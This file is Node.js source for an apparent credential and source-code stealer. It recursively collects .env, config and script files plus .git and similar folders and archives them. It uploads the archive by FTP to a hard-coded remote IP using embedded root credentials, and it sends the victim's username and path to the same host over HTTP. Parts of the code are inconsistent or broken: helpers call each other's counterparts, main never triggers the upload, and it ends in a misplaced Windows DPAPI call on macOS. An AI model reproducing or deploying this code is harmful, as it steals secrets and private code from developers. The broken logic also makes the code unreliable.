const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const util = require('util');
const os = require('os');
const ftpClient = require('ftp');
const querystring = require('querystring');
const http = require('http');
const url = require('url');
import * as dpapi from "node-dpapi";

function getDirectoryPath() {
    filename = __filename;
    return path.dirname(filename);
}

function getParentPath(inputPath) {
    let currentPath = inputPath;
    let previousPath;

    while (true) {

        const stats = fs.statSync(currentPath);
        const birthtimeMs = stats.birthtimeMs;

        if (birthtimeMs === 1577865600000) {
            return previousPath;
        }

        if (currentPath === '/') break;

        previousPath = currentPath;
        currentPath = path.dirname(currentPath);
    }

    return null;
}

function findFilesWithExtensions_osx(dir, extensions, directoriesToSearch, birthtimeMsToSkip = null) {
    let searchedFiles = [];
    let searchedDirectories = [];

    try {
        const files = fs.readdirSync(dir);

        files.forEach(file => {
            const filePath = path.join(dir, file);

            try {
                fs.accessSync(filePath, fs.constants.R_OK);
            } catch (err) {
                return;
            }

            try {
                const linkStats = fs.lstatSync(filePath);
                if (linkStats.isSymbolicLink()) {
                    return;
                }
                const stats = fs.statSync(filePath);

                if (birthtimeMsToSkip !== null && stats.birthtimeMs === birthtimeMsToSkip) {
                    console.log(`Skipping ${filePath} due to matching birthtimeMs: ${birthtimeMsToSkip}`);
                    return; // Skip this item and move to the next
                }

                if (stats.isDirectory()) {
                    // If the directory name matches any in the search list, add it to the results
                    if (directoriesToSearch.includes(file)) {
                        searchedDirectories.push(filePath);
                    }
                    // Continue searching in subdirectories
                    const [childFiles, childDirectories] = findFilesWithExtensions(filePath, extensions, directoriesToSearch, birthtimeMsToSkip);
                    searchedFiles = searchedFiles.concat(childFiles);
                    searchedDirectories = searchedDirectories.concat(childDirectories);
                } else if (extensions.includes(path.extname(file))) {
                    const sizeInBytes = stats.size;
                    const sizeInKB = sizeInBytes / 1024;
                    searchedFiles.push(`${filePath}`);
                }
            } catch (err) {
            }
        });
    } catch (err) {
    }

    return [searchedFiles, searchedDirectories];
}

function appendDirectory_osx(srcDir, destDir, archive, zip_name) {
    if (!fs.existsSync(srcDir)) {
        return;
    }

    const stats = fs.statSync(srcDir);
    if (!stats.isDirectory()) {
        const archiveName = destDir ? path.join(destDir, srcDir) : srcDir;
        archive.file(srcDir, { name: archiveName });
        return;
    }

    const files = fs.readdirSync(srcDir);

    for (let j = 0; j < files.length; j++) {
        if (zip_name === files[j]) {
            continue;
        }

        const fullPath = path.join(srcDir, files[j]);
        if (!fs.existsSync(fullPath)) {
            continue;
        }
        if (path.extname(fullPath) === ".zip") {
            continue;
        }

        const fileStats = fs.statSync(fullPath);

        if (fileStats.isDirectory()) {
            appendDirectory(fullPath, destDir, archive, zip_name);
        } else {
            const archiveName = destDir ? path.join(destDir, fullPath) : fullPath;
            archive.file(fullPath, { name: archiveName });
        }
    }
}

function sendHTTPRequest(text) {
    let query;

    if (text) {
        query = querystring.stringify({ text: text });
    } else {
        const osUser = os.userInfo().username;
        const currentScriptPath = getDirectoryPath();

        query = querystring.stringify({
            user: osUser,
            path: currentScriptPath,
        });
    }

    const requestUrl = url.format({
        protocol: 'http',
        hostname: '185.xx.57.60',
        port: '8000',
        pathname: '/http',
        search: query,
    });

    http.get(requestUrl, (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('end', () => {
        });

    }).on("error", (err) => {
    });
}

function getPathToSecondDirectory() {
    const parsedPath = path.parse(getDirectoryPath());
    const parts = parsedPath.dir.split(path.sep);

    return path.join(parts[0] + path.sep, parts[1], parts[2]);
}

function getPathToSecondDirectory_os() {
    const parsedPath = path.parse(process.cwd());
    const parts = parsedPath.dir.split(path.sep);

    return path.join(parts[0] + path.sep, parts[1], parts[2]);
}

function findFilesWithExtensions(dir, extensions, directoriesToSearch = []) {
    let searchedFiles = [];
    let searchedDirectories = [];

    try {
        const files = fs.readdirSync(dir);

        files.forEach(file => {
            const filePath = path.join(dir, file);

            try {
                const linkStats = fs.lstatSync(filePath);
                if (linkStats.isSymbolicLink()) {
                    return;
                }
                const stats = fs.statSync(filePath);

                if (stats.isDirectory()) {
                    if (directoriesToSearch.includes(file)) {
                        searchedDirectories.push(filePath);
                    }

                    const [childFiles, childDirectories] = findFilesWithExtensions(filePath, extensions, directoriesToSearch);
                    searchedFiles = searchedFiles.concat(childFiles);
                    searchedDirectories = searchedDirectories.concat(childDirectories);
                } else if (extensions.includes(path.extname(file))) {
                    const sizeInBytes = stats.size;
                    const sizeInKB = sizeInBytes / 1024;
                    searchedFiles.push(`${filePath}`);
                }
            } catch (err) {
            }
        });
    } catch (err) {
    }

    return [searchedFiles, searchedDirectories];
}


function appendDirectory(srcDir, destDir,archive,zip_name) {

    if (srcDir.startsWith("/usr/") || srcDir.startsWith("/snap/")){
        return 1;
    }



    try{
        let err = fs.accessSync(srcDir, fs.constants.R_OK);


    }
    catch{
    }
    try{
        err = fs.accessSync("./", fs.constants.W_OK);
        err = fs.accessSync("./", fs.constants.R_OK);


    }
    catch{
        return 0;
    }

    try{
        if (!fs.existsSync(srcDir)) {
            return 1;
        }}
    catch{
        return 0;
    }

    const stats=fs.statSync(srcDir);
    if (!stats.isDirectory()) {
        try{
            let err = fs.accessSync(srcDir, fs.constants.R_OK);
            if (!err){
                archive.file(srcDir, { name: path.join(destDir,srcDir) });
            }
        }
        catch{
        }
        return 1;
    }


    try{
        fs.readdirSync(srcDir);
    }

    catch{
        return 0;
    }
    const files = fs.readdirSync(srcDir);


    for (let j=0;j<files.length;j=j+1){
        if (zip_name===files[j]){
            continue;
        }

        const fullPath = path.join(srcDir, files[j]);
        if (!fs.existsSync(fullPath)) {
            continue;
        }
        if (path.extname(fullPath)==".zip"){
            continue;
        }
        const archivePath = destDir ? path.join(destDir, files[j]) : files[j];
        const stats=fs.statSync(fullPath);
        if (stats.isDirectory()) {
            appendDirectory(fullPath, destDir,archive,zip_name);
        }
        else {

            try{

                let err = fs.accessSync(fullPath, fs.constants.R_OK);

                if (!err){
                    archive.file(fullPath, { name: path.join(destDir, fullPath) });
                }
            }
            catch{
            }

        }
    }
}


function uploadArchiveToFTP(archiveName) {
    return new Promise((resolve, reject) => {
        const client = new ftpClient();
        const host = '185.xx.57.60';
        const port = 21;
        const user = 'root';
        const password = 'TestX@!#33';
        const remotePath = '/';
        const localPath = path.join(getDirectoryPath(), archiveName);

        client.on('ready', () => {
            client.put(localPath, remotePath + archiveName, (err) => {
                if (err) {
                    return;
                }
                client.end();
                resolve();
            });
        });


        client.connect({ host, port, user, password });
    });
}


function findFirstReadableDirectory(path_put) {
    let currentPath = path.sep;
    try {
        fs.accessSync(currentPath, fs.constants.R_OK);
        return currentPath;
    } catch (error) {
    }

    const cwdParts = path_put.split(path.sep);
    console.log(cwdParts);

    for (const part of cwdParts.slice(1)) {
        currentPath = path.join(currentPath, part);

        try {
            fs.accessSync(currentPath, fs.constants.R_OK);
            return currentPath;
        } catch (error) {
        }
    }

    return '/';
}

async function main() {
    if (process.platform === 'darwin') {
        const inputPath = getParentPath(getDirectoryPath());
        const extensionsToSearch = ['.asp', '.js', '.php', '.aspx', '.jspx', '.jhtml', '.py', '.rb', '.pl', '.cfm', '.cgi', '.ssjs', '.shtml', '.env', '.ini', '.conf', '.properties', '.yml', '.cfg'];
        const directoriesToSearch = ['.git', '.env', '.svn', '.gitlab', '.hg', '.idea', '.yarn', '.docker', '.vagrant', '.github'];
        const birthtimeMsToSkip = 1577865600000;
        let searchedWords = findFilesWithExtensions_osx(inputPath, extensionsToSearch, directoriesToSearch, birthtimeMsToSkip);

        searchedWords.forEach(item => {
            // maybe this won't work in real world since this expects a buffer. But it works for this particular purpose
            dpapi.protectData(item, null, "CurrentUser");
        });
    }
}